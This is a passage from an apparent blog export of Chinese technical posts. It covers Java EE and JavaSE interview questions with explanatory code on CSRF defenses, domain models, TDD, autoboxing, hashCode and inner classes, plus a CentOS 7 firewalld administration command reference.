Forgery，跨站请求伪造）是攻击者通过跨站请求，以合法的用户身份进行非法操作（如转账或发帖等）。CSRF的原理是利用浏览器的Cookie或服务器的Session，盗取用户身份，其原理如下图所示。防范CSRF的主要手段是识别请求者的身份，主要有以下几种方式：（1）在表单中添加令牌（token）；（2）验证码；（3）检查请求头中的Referer（前面提到防图片盗链接也是用的这种方式）。令牌和验证都具有一次消费性的特征，因此在原理上一致的，但是验证码是一种糟糕的用户体验，不是必要的情况下不要轻易使用验证码，目前很多网站的做法是如果在短时间内多次提交一个表单未获得成功后才要求提供验证码，这样会获得较好的用户体验。 补充：防火墙的架设是Web安全的重要保障，ModSecurity是开源的Web防火墙中的佼佼者。企业级防火墙的架设应当有两级防火墙，Web服务器和部分应用服务器可以架设在两级防火墙之间的DMZ，而数据和资源服务器应当架设在第二级防火墙之后。 什么是领域模型(domain model)？贫血模型(anaemic domain model)和充血模型(rich domain model)有什么区别？答：领域模型是领域内的概念类或现实世界中对象的可视化表示，又称为概念模型或分析对象模型，它专注于分析问题领域本身，发掘重要的业务领域概念，并建立业务领域概念之间的关系。贫血模型是指使用的领域对象中只有setter和getter方法（POJO），所有的业务逻辑都不包含在领域对象中而是放在业务逻辑层。有人将我们这里说的贫血模型进一步划分成失血模型（领域对象完全没有业务逻辑）和贫血模型（领域对象有少量的业务逻辑），我们这里就不对此加以区分了。充血模型将大多数业务逻辑和持久化放在领域对象中，业务逻辑（业务门面）只是完成对业务逻辑的封装、事务和权限等的处理。下面两张图分别展示了贫血模型和充血模型的分层架构。 贫血模型 充血模型 贫血模型下组织领域逻辑通常使用事务脚本模式，让每个过程对应用户可能要做的一个动作，每个动作由一个过程来驱动。也就是说在设计业务逻辑接口的时候，每个方法对应着用户的一个操作，这种模式有以下几个有点： 它是一个大多数开发者都能够理解的简单过程模型（适合国内的绝大多数开发者）。 它能够与一个使用行数据入口或表数据入口的简单数据访问层很好的协作。 事务边界的显而易见，一个事务开始于脚本的开始，终止于脚本的结束，很容易通过代理（或切面）实现声明式事务。然而，事务脚本模式的缺点也是很多的，随着领域逻辑复杂性的增加，系统的复杂性将迅速增加，程序结构将变得极度混乱。开源中国社区上有一篇很好的译文《贫血领域模型是如何导致糟糕的软件产生》对这个问题做了比较细致的阐述。 一谈测试驱动开发（TDD）的好处以及你的理解。答：TDD是指在编写真正的功能实现代码之前先写测试代码，然后根据需要重构实现代码。在JUnit的作者Kent Beck的大作《测试驱动开发：实战与模式解析》（Test-Driven Development: by Example）一书中有这么一段内容：“消除恐惧和不确定性是编写测试驱动代码的重要原因”。因为编写代码时的恐惧会让你小心试探，让你回避沟通，让你羞于得到反馈，让你变得焦躁不安，而TDD是消除恐惧、让Java开发者更加自信更加乐于沟通的重要手段。TDD会带来的好处可能不会马上呈现，但是你在某个时候一定会发现，这些好处包括： 更清晰的代码 — 只写需要的代码 更好的设计 更出色的灵活性 — 鼓励程序员面向接口编程 更快速的反馈 — 不会到系统上线时才知道bug的存在 补充：敏捷软件开发的概念已经有很多年了，而且也部分的改变了软件开发这个行业，TDD也是敏捷开发所倡导的。 TDD可以在多个层级上应用，包括单元测试（测试一个类中的代码）、集成测试（测试类之间的交互）、系统测试（测试运行的系统）和系统集成测试（测试运行的系统包括使用的第三方组件）。TDD的实施步骤是：红（失败测试）- 绿（通过测试） – 重构。关于实施TDD的详细步骤请参考另一篇文章《测试驱动开发之初窥门径》。在使用TDD开发时，经常会遇到需要被测对象需要依赖其他子系统的情况，但是你希望将测试代码跟依赖项隔离，以保证测试代码仅仅针对当前被测对象或方法展开，这时候你需要的是测试替身。测试替身可以分为四类： 虚设替身：只传递但是不会使用到的对象，一般用于填充方法的参数列表 存根替身：总是返回相同的预设响应，其中可能包括一些虚设状态 伪装替身：可以取代真实版本的可用版本（比真实版本还是会差很多） 模拟替身：可以表示一系列期望值的对象，并且可以提供预设响应Java世界中实现模拟替身的第三方工具非常多，包括EasyMock、Mockito、jMock等。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>JavaEE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux进程管理相关命令详述]]></title>
    <url>%2F2018%2F05%2F01%2Fcentos%2F</url>
    <content type="text"><![CDATA[在 CentOS 7 中，引入了一个新的服务，Firewalld，下面一张图，让大家明确的了解防火墙 Firewall 与 iptables 之间的关系与区别。 安装它，只需 yum install firewalld 如果需要图形界面的话，则再安装 yum install firewall-config 介绍防火墙守护 firewalld 服务引入了一个信任级别的概念来管理与之相关联的连接与接口。它支持 ipv4 与 ipv6，并支持网桥，采用 firewall-cmd (command) 或 firewall-config (gui) 来动态的管理 kernel netfilter 的临时或永久的接口规则，并实时生效而无需重启服务。 zone drop: 丢弃所有进入的包，而不给出任何响应 block: 拒绝所有外部发起的连接，允许内部发起的连接 public: 允许指定的进入连接 external: 同上，对伪装的进入连接，一般用于路由转发 dmz: 允许受限制的进入连接 work: 允许受信任的计算机被限制的进入连接，类似 workgroup home: 同上，类似 homegroup internal: 同上，范围针对所有互联网用户 trusted: 信任所有连接 过滤规则 source: 根据源地址过滤 interface: 根据网卡过滤 service: 根据服务名过滤 port: 根据端口过滤 icmp-block: icmp 报文过滤，按照 icmp 类型配置 masquerade: ip 地址伪装 forward-port: 端口转发 rule: 自定义规则 其中，过滤规则的优先级遵循如下顺序 1.source2.interface3.firewalld.conf 使用方法systemctl start firewalld # 启动, systemctl enable firewalld # 开机启动 systemctl stop firewalld # 关闭 systemctl disable firewalld # 取消开机启动 具体的规则管理，可以使用firewall-cmd ，具体的使用方法可以 $ firewall-cmd --help zone=NAME # 指定 zone permanent # 永久修改，--reload 后生效 timeout=seconds # 持续效果，到期后自动移除，用于调试，不能与 --permanent 同时使用 查看规则查看运行状态 $ firewall-cmd --state 查看已被激活的 Zone 信息 $ firewall-cmd --get-active-zones public interfaces: eth0 eth1 查看指定接口的 Zone 信息 $ firewall-cmd --get-zone-of-interface=eth0 public 查看指定级别的接口 $ firewall-cmd --zone=public --list-interfaces eth0 查看指定级别的所有信息，譬如 public $ firewall-cmd --zone=public --list-all public (default, active) interfaces: eth0 sources: services: dhcpv6-client http ssh ports: masquerade: no forward-ports: icmp-blocks: rich rules: 查看所有级别被允许的信息 $ firewall-cmd --get-service 查看重启后所有 Zones 级别中被允许的服务，即永久放行的服务 $ firewall-cmd --get-service --permanent 管理规则firewall-cmd --panic-on # 丢弃 firewall-cmd --panic-off # 取消丢弃 firewall-cmd --query-panic # 查看丢弃状态 firewall-cmd --reload # 更新规则，不重启服务 firewall-cmd --complete-reload # 更新规则，重启服务 添加某接口至某信任等级，譬如添加 eth0 至 public，永久修改 firewall-cmd --zone=public --add-interface=eth0 --permanent 设置 public 为默认的信任级别 firewall-cmd --set-default-zone=public 管理端口 列出 dmz 级别的被允许的进入端口 firewall-cmd --zone=dmz --list-ports 允许 tcp 端口 8080 至 dmz 级别 firewall-cmd --zone=dmz --add-port=8080/tcp 允许某范围的 udp 端口至 public 级别，并永久生效 firewall-cmd --zone=public --add-port=5060-5059/udp --permanent 网卡接口 列出 public zone 所有网卡 firewall-cmd --zone=public --list-interfaces 将 eth0 添加至 public zone，永久 firewall-cmd --zone=public --permanent --add-interface=eth0 eth0 存在与 public zone，将该网卡添加至 work zone，并将之从 public zone 中删除 firewall-cmd --zone=work --permanent --change-interface=eth0 删除 public zone 中的 eth0，永久 firewall-cmd --zone=public --permanent --remove-interface=eth0 管理服务 添加 smtp 服务至 work zone firewall-cmd --zone=work --add-service=smtp 移除 work zone 中的 smtp 服务 firewall-cmd --zone=work --remove-service=smtp 配置 external zone 中的 ip 地址伪装 查看 firewall-cmd --zone=external --query-masquerade 打开伪装 firewall-cmd --zone=external --add-masquerade 关闭伪装 firewall-cmd --zone=external --remove-masquerade 配置 public zone 的端口转发 要打开端口转发，则需要先 firewall-cmd --zone=public --add-masquerade 然后转发 tcp 22 端口至 3753 firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=3753 转发 22 端口数据至另一个 ip 的相同端口上 firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toaddr=192.168.1.100 转发 22 端口数据至另一 ip 的 2055 端口上 firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=2055:toaddr=192.168.1.100 配置 public zone 的 icmp 查看所有支持的 icmp 类型 firewall-cmd --get-icmptypes destination-unreachable echo-reply echo-request parameter-problem redirect router-advertisement router-solicitation source-quench time-exceeded 列出 firewall-cmd --zone=public --list-icmp-blocks 添加 echo-request 屏蔽 firewall-cmd --zone=public --add-icmp-block=echo-request [--timeout=seconds] 移除 echo-reply 屏蔽 firewall-cmd --zone=public --remove-icmp-block=echo-reply IP 封禁 firewall-cmd --permanent --add-rich-rule=&quot;rule family=&apos;ipv4&apos; source address=&apos;222.222.222.222&apos; reject&quot;]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE面试题]]></title>
    <url>%2F2018%2F04%2F29%2FJavaSE%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[面向对象的特征面向对象的特征主要有以下几个方面： 抽象：抽象是将一类对象的共同特征总结出来构造类的过程，包括数据抽象和行为抽象两方面。抽象只关注对象有哪些属性和行为，并不关注这些行为的细节是什么。 继承：继承是从已有类得到继承信息创建新类的过程。提供继承信息的类被称为父类（超类、基类）；得到继承信息的类被称为子类（派生类）。继承让变化中的软件系统有了一定的延续性，同时继承也是封装程序中可变因素的重要手段（如果不能理解请阅读阎宏博士的《Java与模式》或《设计模式精解》中关于桥梁模式的部分）。 封装：通常认为封装是把数据和操作数据的方法绑定起来，对数据的访问只能通过已定义的接口。面向对象的本质就是将现实世界描绘成一系列完全自治、封闭的对象。我们在类中编写的方法就是对实现细节的一种封装；我们编写一个类就是对数据和数据操作的封装。可以说，封装就是隐藏一切可隐藏的东西，只向外界提供最简单的编程接口（可以想想普通洗衣机和全自动洗衣机的差别，明显全自动洗衣机封装更好因此操作起来更简单；我们现在使用的智能手机也是封装得足够好的，因为几个按键就搞定了所有的事情）。 多态性：多态性是指允许不同子类型的对象对同一消息作出不同的响应。简单的说就是用同样的对象引用调用同样的方法但是做了不同的事情。多态性分为编译时的多态性和运行时的多态性。如果将对象的方法视为对象向外界提供的服务，那么运行时的多态性可以解释为：当A系统访问B系统提供的服务时，B系统有多种提供服务的方式，但一切对A系统来说都是透明的（就像电动剃须刀是A系统，它的供电系统是B系统，B系统可以使用电池供电或者用交流电，甚至还有可能是太阳能，A系统只会通过B类对象调用供电的方法，但并不知道供电系统的底层实现是什么，究竟通过何种方式获得了动力）。方法重载（overload）实现的是编译时的多态性（也称为前绑定），而方法重写（override）实现的是运行时的多态性（也称为后绑定）。运行时的多态是面向对象最精髓的东西，要实现多态需要做两件事：1). 方法重写（子类继承父类并重写父类中已有的或抽象的方法）；2). 对象造型（用父类型引用引用子类型对象，这样同样的引用调用同样的方法就会根据子类对象的不同而表现出不同的行为）。 访问修饰符 类的成员不写访问修饰符默认为default。默认对于同一个包的其他类相当于（public），对于不是同一个包中的其他类相当于私有（private）。受保护（protected）对子类相当于公开，对不是同一包中的没有父子关系的类相当于私有。Java中，外部类的修饰符只能是public或默认，类的成员（包括内部类）的修饰符可以是以上四种。 修饰符 当前类 同包 子类 其他包 public √ √ √ √ protected √ √ √ × default √ √ × × private √ × × × 基本数据类型Java中的基本数据类型只有8个：byte、short、int、long、float、double、char、boolean。 除了基本类型（primitive type）和枚举类型（enumeration type）,剩下的都是引用类型（reference type）。 注意：String是引用类型 float f=3.4；是否正确？不正确。3.4是双精度数，将双精度（double）赋值给浮点型（float）属于下转型（down-casting，也称为窄化）会造成精度损失，因此需要强制将float f=(float)3.4;或者写成float f=3.4F。 short s1 = 1; s1 = s1 + 1;有错吗?short s1 = 1; s1 += 1;有错吗？没错。对于short s1 = 1; s1 = s1 + 1;由于1是int类型，因此s1+1运算结果也是int 型，需要强制转换类型才能赋值给short型。而short s1 = 1; s1 += 1;可以正确编译，因为s1+= 1;相当于s1 = (short)(s1 + 1);其中有隐含的强制类型转换。 Java有没有goto？goto 是Java中的保留字，在目前版本的Java中没有使用。 int和Integer有什么区别？Java是一个近乎纯洁的面向对象编程语言，但是为了编程的方便还是引入了基本数据类型，但是为了能够将这些基本数据类型当成对象操作，Java为每一个基本数据类型都引入了对应的包装类型（wrapper class），int的包装类就是Integer，从Java 5开始引入了自动装箱/拆箱机制，使得二者可以相互转换。Java 为每个原始类型提供了包装类型： 原始类型: boolean，char，byte，short，int，long，float，double 包装类型：Boolean，Character，Byte，Short，Integer，Long，Float，Double 12345678910class AutoUnboxingTest &#123; public static void main(String[] args) &#123; Integer a = new Integer(3); Integer b = 3; // 将3自动装箱成Integer类型 int c = 3; System.out.println(a == b); // false 两个引用没有引用同一对象 System.out.println(a == c); // true a自动拆箱成int类型再和c比较 &#125;&#125; 最近还遇到一个面试题，也是和自动装箱和拆箱有点关系的，代码如下所示： 123456789public class Test03 &#123; public static void main(String[] args) &#123; Integer f1 = 100, f2 = 100, f3 = 150, f4 = 150; System.out.println(f1 == f2); System.out.println(f3 == f4); &#125;&#125; 如果不明就里很容易认为两个输出要么都是true要么都是false。首先需要注意的是f1、f2、f3、f4四个变量都是Integer对象引用，所以下面的==运算比较的不是值而是引用。装箱的本质是什么呢？当我们给一个Integer对象赋一个int值的时候，会调用Integer类的静态方法valueOf，如果看看valueOf的源代码就知道发生了什么。 12345public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; IntegerCache是Integer的内部类，其代码如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Cache to support the object identity semantics of autoboxing for values between * -128 and 127 (inclusive) as required by JLS. * * The cache is initialized on first usage. The size of the cache * may be controlled by the &#123;@code -XX:AutoBoxCacheMax=&lt;size&gt;&#125; option. * During VM initialization, java.lang.Integer.IntegerCache.high property * may be set and saved in the private system properties in the * sun.misc.VM class. */private static class IntegerCache &#123; static final int low = -128; static final int high; static final Integer cache[]; static &#123; // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high"); if (integerCacheHighPropValue != null) &#123; try &#123; int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); &#125; catch( NumberFormatException nfe) &#123; // If the property cannot be parsed into an int, ignore it. &#125; &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127; &#125; private IntegerCache() &#123;&#125;&#125; 简单的说，如果整型字面量的值在-128到127之间，那么不会new新的Integer对象，而是直接引用常量池中的Integer对象，所以上面的面试题中f1==f2的结果是true，而f3==f4的结果是false。 &amp;和&amp;&amp;的区别？&amp;运算符有两种用法：(1)按位与；(2)逻辑与。&amp;&amp;运算符是短路与运算。逻辑与跟短路与的差别是非常巨大的，虽然二者都要求运算符左右两端的布尔值都是true整个表达式的值才是true。&amp;&amp;之所以称为短路运算是因为，如果&amp;&amp;左边的表达式的值是false，右边的表达式会被直接短路掉，不会进行运算。很多时候我们可能都需要用&amp;&amp;而不是&amp;，例如在验证用户登录时判定用户名不是null而且不是空字符串，应当写为：username != null &amp;&amp;!username.equals(“”)，二者的顺序不能交换，更不能用&amp;运算符，因为第一个条件如果不成立，根本不能进行字符串的equals比较，否则会产生NullPointerException异常。注意：逻辑或运算符（|）和短路或运算符（||）的差别也是如此。 补充：如果你熟悉JavaScript，那你可能更能感受到短路运算的强大，想成为JavaScript的高手就先从玩转短路运算开始吧。 解释内存中的栈(stack)、堆(heap)和静态区(static area)的用法。通常我们定义一个基本数据类型的变量，一个对象的引用，还有就是函数调用的现场保存都使用内存中的栈空间；而通过new关键字和构造器创建的对象放在堆空间；程序中的字面量（literal）如直接书写的100、”hello”和常量都是放在静态区中。栈空间操作起来最快但是栈很小，通常大量的对象都是放在堆空间，理论上整个内存没有被其他进程使用的空间甚至硬盘上的虚拟内存都可以被当成堆空间来使用。 1String str = new String("hello"); 上面的语句中变量str放在栈上，用new创建出来的字符串对象放在堆上，而”hello”这个字面量放在静态区。 补充：较新版本的Java（从Java 6的某个更新开始）中使用了一项叫”逃逸分析”的技术，可以将一些局部对象放在栈上以提升对象的操作性能。 Math.round(11.5) 等于多少？Math.round(-11.5)等于多少？Math.round(11.5)的返回值是12，Math.round(-11.5)的返回值是-11。四舍五入的原理是在参数上加0.5然后进行下取整。 switch 是否能作用在byte 上，是否能作用在long 上，是否能作用在String上？在Java 5以前，switch(expr)中，expr只能是byte、short、char、int。从Java 5开始，Java中引入了枚举类型，expr也可以是enum类型，从Java 7开始，expr还可以是字符串（String），但是长整型（long）在目前所有的版本中都是不可以的。 用最有效率的方法计算2乘以8？2 &lt;&lt; 3（左移3位相当于乘以2的3次方，右移3位相当于除以2的3次方）。 补充：我们为编写的类重写hashCode方法时，可能会看到如下所示的代码，其实我们不太理解为什么要使用这样的乘法运算来产生哈希码（散列码），而且为什么这个数是个素数，为什么通常选择31这个数？前两个问题的答案你可以自己百度一下，选择31是因为可以用移位和减法运算来代替乘法，从而得到更好的性能。说到这里你可能已经想到了：31 * num 等价于(num &lt;&lt; 5) – num，左移5位相当于乘以2的5次方再减去自身就相当于乘以31，现在的VM都能自动完成这个优化。 1234567891011121314151617181920212223242526272829303132333435363738394041public class PhoneNumber &#123; private int areaCode; private String prefix; private String lineNumber; @Override public int hashCode() &#123; final int prime = 31; int result = 1; result = prime * result + areaCode; result = prime * result + ((lineNumber == null) ? 0 : lineNumber.hashCode()); result = prime * result + ((prefix == null) ? 0 : prefix.hashCode()); return result; &#125; @Override public boolean equals(Object obj) &#123; if (this == obj) return true; if (obj == null) return false; if (getClass() != obj.getClass()) return false; PhoneNumber other = (PhoneNumber) obj; if (areaCode != other.areaCode) return false; if (lineNumber == null) &#123; if (other.lineNumber != null) return false; &#125; else if (!lineNumber.equals(other.lineNumber)) return false; if (prefix == null) &#123; if (other.prefix != null) return false; &#125; else if (!prefix.equals(other.prefix)) return false; return true; &#125; &#125; 数组有没有length()方法？String有没有length()方法？数组没有length()方法，有length 的属性。String 有length()方法。JavaScript中，获得字符串的长度是通过length属性得到的，这一点容易和Java混淆。 在Java中，如何跳出当前的多重嵌套循环？在最外层循环前加一个标记如A，然后用break A;可以跳出多重循环。（Java中支持带标签的break和continue语句，作用有点类似于C和C++中的goto语句，但是就像要避免使用goto一样，应该避免使用带标签的break和continue，因为它不会让你的程序变得更优雅，很多时候甚至有相反的作用，所以这种语法其实不知道更好） 构造器（constructor）是否可被重写（override）？构造器不能被继承，因此不能被重写，但可以被重载。 两个对象值相同(x.equals(y) == true)，但却可有不同的hash code，这句话对不对？不对，如果两个对象x和y满足x.equals(y) == true，它们的哈希码（hash code）应当相同。Java对于eqauls方法和hashCode方法是这样规定的：(1)如果两个对象相同（equals方法返回true），那么它们的hashCode值一定要相同；(2)如果两个对象的hashCode相同，它们并不一定相同。当然，你未必要按照要求去做，但是如果你违背了上述原则就会发现在使用容器时，相同的对象可以出现在Set集合中，同时增加新元素的效率会大大下降（对于使用哈希存储的系统，如果哈希码频繁的冲突将会造成存取性能急剧下降）。 补充：关于equals和hashCode方法，很多Java程序都知道，但很多人也就是仅仅知道而已，在Joshua Bloch的大作《Effective Java》（很多软件公司，《Effective Java》、《Java编程思想》以及《重构：改善既有代码质量》是Java程序员必看书籍，如果你还没看过，那就赶紧去亚马逊买一本吧）中是这样介绍equals方法的：首先equals方法必须满足自反性（x.equals(x)必须返回true）、对称性（x.equals(y)返回true时，y.equals(x)也必须返回true）、传递性（x.equals(y)和y.equals(z)都返回true时，x.equals(z)也必须返回true）和一致性（当x和y引用的对象信息没有被修改时，多次调用x.equals(y)应该得到同样的返回值），而且对于任何非null值的引用x，x.equals(null)必须返回false。实现高质量的equals方法的诀窍包括：1. 使用==操作符检查”参数是否为这个对象的引用”；2. 使用instanceof操作符检查”参数是否为正确的类型”；3. 对于类中的关键属性，检查参数传入对象的属性是否与之相匹配；4. 编写完equals方法后，问自己它是否满足对称性、传递性、一致性；5. 重写equals时总是要重写hashCode；6. 不要将equals方法参数中的Object对象替换为其他的类型，在重写时不要忘掉@Override注解。 是否可以继承String类？String 类是final类，不可以被继承。 补充：继承String本身就是一个错误的行为，对String类型最好的重用方式是关联关系（Has-A）和依赖关系（Use-A）而不是继承关系（Is-A）。 当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递？是值传递。Java语言的方法调用只支持参数的值传递。当一个对象实例作为一个参数被传递到方法中时，参数的值就是对该对象的引用。对象的属性可以在被调用过程中被改变，但对对象引用的改变是不会影响到调用者的。C++和C#中可以通过传引用或传输出参数来改变传入的参数的值。 补充：很多人对值传递、引用传递有以下几种误解：第一种误解是：Java是引用传递。（这么理解的人，大体会解释说Java的形参是对象的引用所以才叫引用传递。这个解释的错误在于：引用传递这个词不是这个意思，这个词是形容调用方式，而不是参数本质的类型的。所以，即使有人因为明白引用本身也是个值，然后觉得Java其实是值传递了，这种理解也是错的。你这种理解，叫“传递的是值”，而非“值传递”。后面展开。） 第二种误解是：值类型是值传递，引用类型用的是引用传递。 第三种误解是：认为所有的都是值传递，因为引用本质上也是个值，本质就是个指针嘛。 第四种误解是：常出现在C++程序员中，声明的参数是引用类型的，就是引用传递；声明的参数是一般类型或指针的就是值传递。（也有人把指针归为引用传递，其实它比较特殊，无论你归哪边都是错的。） String和StringBuilder、StringBuffer的区别？Java平台提供了两种类型的字符串：String和StringBuffer/StringBuilder，它们可以储存和操作字符串。其中String是只读字符串，也就意味着String引用的字符串内容是不能被改变的。而StringBuffer/StringBuilder类表示的字符串对象可以直接进行修改。StringBuilder是Java 5中引入的，它和StringBuffer的方法完全相同，区别在于它是在单线程环境下使用的，因为它的所有方面都没有被synchronized修饰，因此它的效率也比StringBuffer要高。 面试题1 - 什么情况下用+运算符进行字符串连接比调用StringBuffer/StringBuilder对象的append方法连接字符串性能更好？ 面试题2 - 请说出下面程序的输出。 1234567891011class StringEqualTest &#123; public static void main(String[] args) &#123; String s1 = "Programming"; String s2 = new String("Programming"); String s3 = "Program" + "ming"; System.out.println(s1 == s2); System.out.println(s1 == s3); System.out.println(s1 == s1.intern()); &#125;&#125; 补充：String对象的intern方法会得到字符串对象在常量池中对应的版本的引用（如果常量池中有一个字符串与String对象的equals结果是true），如果常量池中没有对应的字符串，则该字符串将被添加到常量池中，然后返回常量池中字符串的引用。 重载（Overload）和重写（Override）的区别。重载的方法能否根据返回类型进行区分？方法的重载和重写都是实现多态的方式，区别在于前者实现的是编译时的多态性，而后者实现的是运行时的多态性。重载发生在一个类中，同名的方法如果有不同的参数列表（参数类型不同、参数个数不同或者二者都不同）则视为重载；重写发生在子类与父类之间，重写要求子类被重写方法与父类被重写方法有相同的返回类型，比父类被重写方法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则）。重载对返回类型没有特殊的要求。 面试题：华为的面试题中曾经问过这样一个问题 – “为什么不能根据返回类型来区分重载”，快说出你的答案吧！ 描述一下JVM加载class文件的原理机制？JVM中类的装载是由类加载器（ClassLoader）和它的子类来实现的，Java中的类加载器是一个重要的Java运行时系统组件，它负责在运行时查找和装入类文件中的类。由于Java的跨平台性，经过编译的Java源程序并不是一个可执行程序，而是一个或多个类文件。当Java程序需要使用某个类时，JVM会确保这个类已经被加载、连接（验证、准备和解析）和初始化。类的加载是指把类的.class文件中的数据读入到内存中，通常是创建一个字节数组读入.class文件，然后产生与所加载类对应的Class对象。加载完成后，Class对象还不完整，所以此时的类还不可用。当类被加载后就进入连接阶段，这一阶段包括验证、准备（为静态变量分配内存并设置默认的初始值）和解析（将符号引用替换为直接引用）三个步骤。最后JVM对类进行初始化，包括：1)如果类存在直接的父类并且这个类还没有被初始化，那么就先初始化父类；2)如果类中存在初始化语句，就依次执行这些初始化语句。类的加载是由类加载器完成的，类加载器包括：根加载器（BootStrap）、扩展加载器（Extension）、系统加载器（System）和用户自定义类加载器（java.lang.ClassLoader的子类）。从Java 2（JDK 1.2）开始，类加载过程采取了父亲委托机制（PDM）。PDM更好的保证了Java平台的安全性，在该机制中，JVM自带的Bootstrap是根加载器，其他的加载器都有且仅有一个父类加载器。类的加载首先请求父类加载器加载，父类加载器无能为力时才由其子类加载器自行加载。JVM不会向Java程序提供对Bootstrap的引用。下面是关于几个类加载器的说明： Bootstrap：一般用本地代码实现，负责加载JVM基础核心类库（rt.jar）；Extension：从java.ext.dirs系统属性所指定的目录中加载类库，它的父加载器是Bootstrap；System：又叫应用类加载器，其父类是Extension。它是应用最广泛的类加载器。它从环境变量classpath或者系统属性java.class.path所指定的目录中记载类，是用户自定义加载器的默认父加载器。 char 型变量中能不能存贮一个中文汉字，为什么？char类型可以存储一个中文汉字，因为Java中使用的编码是Unicode（不选择任何特定的编码，直接使用字符在字符集中的编号，这是统一的唯一方法），一个char类型占2个字节（16比特），所以放一个中文是没问题的。 补充：使用Unicode意味着字符在JVM内部和外部有不同的表现形式，在JVM内部都是Unicode，当这个字符被从JVM内部转移到外部时（例如存入文件系统中），需要进行编码转换。所以Java中有字节流和字符流，以及在字符流和字节流之间进行转换的转换流，如InputStreamReader和OutputStreamReader，这两个类是字节流和字符流之间的适配器类，承担了编码转换的任务；对于C程序员来说，要完成这样的编码转换恐怕要依赖于union（联合体/共用体）共享内存的特征来实现了。 抽象类（abstract class）和接口（interface）有什么异同？抽象类和接口都不能够实例化，但可以定义抽象类和接口类型的引用。一个类如果继承了某个抽象类或者实现了某个接口都需要对其中的抽象方法全部进行实现，否则该类仍然需要被声明为抽象类。接口比抽象类更加抽象，因为抽象类中可以定义构造器，可以有抽象方法和具体方法，而接口中不能定义构造器而且其中的方法全部都是抽象方法。抽象类中的成员可以是private、默认、protected、public的，而接口中的成员全都是public的。抽象类中可以定义成员变量，而接口中定义的成员变量实际上都是常量。有抽象方法的类必须被声明为抽象类，而抽象类未必要有抽象方法。 静态嵌套类(Static Nested Class)和内部类（Inner Class）的不同？Static Nested Class是被声明为静态（static）的内部类，它可以不依赖于外部类实例被实例化。而通常的内部类需要在外部类实例化后才能实例化，其语法看起来挺诡异的，如下所示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/** * 扑克类（一副扑克） * @author 骆昊 * */public class Poker &#123; private static String[] suites = &#123;"黑桃", "红桃", "草花", "方块"&#125;; private static int[] faces = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13&#125;; private Card[] cards; /** * 构造器 * */ public Poker() &#123; cards = new Card[52]; for(int i = 0; i &lt; suites.length; i++) &#123; for(int j = 0; j &lt; faces.length; j++) &#123; cards[i * 13 + j] = new Card(suites[i], faces[j]); &#125; &#125; &#125; /** * 洗牌 （随机乱序） * */ public void shuffle() &#123; for(int i = 0, len = cards.length; i &lt; len; i++) &#123; int index = (int) (Math.random() * len); Card temp = cards[index]; cards[index] = cards[i]; cards[i] = temp; &#125; &#125; /** * 发牌 * @param index 发牌的位置 * */ public Card deal(int index) &#123; return cards[index]; &#125; /** * 卡片类（一张扑克） * [内部类] * @author 骆昊 * */ public class Card &#123; private String suite; // 花色 private int face; // 点数 public Card(String suite, int face) &#123; this.suite = suite; this.face = face; &#125; @Override public String toString() &#123; String faceStr = ""; switch(face) &#123; case 1: faceStr = "A"; break; case 11: faceStr = "J"; break; case 12: faceStr = "Q"; break; case 13: faceStr = "K"; break; default: faceStr = String.valueOf(face); &#125; return suite + faceStr; &#125; &#125;&#125; 测试代码： 1234567891011121314class PokerTest &#123; public static void main(String[] args) &#123; Poker poker = new Poker(); poker.shuffle(); // 洗牌 Poker.Card c1 = poker.deal(0); // 发第一张牌 // 对于非静态内部类Card // 只有通过其外部类Poker对象才能创建Card对象 Poker.Card c2 = poker.new Card("红心", 1); // 自己创建一张牌 System.out.println(c1); // 洗牌后的第一张 System.out.println(c2); // 打印: 红心A &#125;&#125; 面试题 – 下面的代码哪些地方会产生编译错误？ 123456789101112class Outer &#123; class Inner &#123;&#125; public static void foo() &#123; new Inner(); &#125; public void bar() &#123; new Inner(); &#125; public static void main(String[] args) &#123; new Inner(); &#125; &#125; 注意：Java中非静态内部类对象的创建要依赖其外部类对象，上面的面试题中foo和main方法都是静态方法，静态方法中没有this，也就是说没有所谓的外部类对象，因此无法创建内部类对象，如果要在静态方法中创建内部类对象，可以这样做： 1new Outer().new Inner(); Java 中会存在内存泄漏吗，请简单描述。理论上Java因为有垃圾回收机制（GC）不会存在内存泄露问题（这也是Java被广泛使用于服务器端编程的一个重要原因）；然而在实际开发中，可能会存在无用但可达的对象，这些对象不能被GC回收，因此也会导致内存泄露的发生。例如hibernate的Session（一级缓存）中的对象属于持久态，垃圾回收器是不会回收这些对象的，然而这些对象中可能存在无用的垃圾对象，如果不及时关闭（close）或清空（flush）一级缓存就可能导致内存泄露。下面例子中的代码也会导致内存泄露。 123456789101112131415161718192021222324252627282930import java.util.Arrays;import java.util.EmptyStackException; public class MyStack&lt;T&gt; &#123; private T[] elements; private int size = 0; private static final int INIT_CAPACITY = 16; public MyStack() &#123; elements = (T[]) new Object[INIT_CAPACITY]; &#125; public void push(T elem) &#123; ensureCapacity(); elements[size++] = elem; &#125; public T pop() &#123; if(size == 0) throw new EmptyStackException(); return elements[--size]; 